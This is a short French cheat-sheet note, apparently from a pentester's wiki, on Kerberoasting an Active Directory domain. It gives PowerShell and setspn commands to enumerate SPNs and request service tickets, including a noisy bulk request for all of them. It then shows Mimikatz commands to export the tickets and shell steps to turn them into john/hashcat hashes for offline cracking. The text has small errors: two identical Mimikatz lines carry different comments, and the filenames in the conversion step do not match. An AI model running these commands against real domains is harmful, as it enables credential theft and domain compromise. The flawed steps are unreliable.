---
public: true # set to true to make the article publishable
---

## Récupérer un TGS

### Liste des comptes avec leurs SPNs
```shell
# Enumérer tous les SPNs
setspn.exe -q */*
```

### Demande d'un TGS

```powershell
# Demander un TGS pour le SPN désiré (compte utilisateur)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MyUSERWithSPN/srvtest.domain.local"
```

### Demander tous les TGS existants

Attention, cela ne sera pas du tout furtif !

```powershell
# Demander tous les TGS possibles
Add-Type -AssemblyName System.IdentityModel
setspn.exe -T DOMAIN.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

## Extraire le ou les Tickets (TGS)

Une fois les TGS générés par le KDC et stockés dans le système d'exploitation, on peut les récupérer via `Mimikatz`. 

```
mimikatz # base64 /out:true    <==== si on veut les transférer par copier / coller par exemple
mimikatz # base64 /out:true    <==== si on veut générer des fichiers .kirbi

mimikatz # kerberos::list /export  
```

```shell
# conversion depuis base64
echo "<base64 blob>" |  tr -d \\n | base64 -d > myUser.kirbi
# Extraction du hash pour l'utiliser avec john / hashcat
kirbi2john.py myUser.kirbi > vmware.hash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' myuser.hash > myUser_tgs_hashcat
```


[[Cassage de mots de passes Kerberos]]